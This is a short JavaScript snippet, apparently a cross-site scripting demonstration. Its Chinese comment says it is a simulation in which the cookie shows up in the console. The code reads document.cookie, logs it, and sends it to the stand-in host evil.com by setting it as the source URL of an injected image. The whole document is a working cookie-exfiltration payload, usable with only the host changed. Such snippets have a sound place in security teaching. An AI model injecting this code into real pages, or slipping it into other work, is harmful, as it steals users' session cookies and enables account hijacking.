var img = document.createElement("img");
img.src = "http://www.evil.com/log?cookie=" + escape(document.cookie);
console.log("Cookie: " + document.cookie);  // 这是一个模拟，你可以在控制台看到Cookie
document.body.appendChild(img);
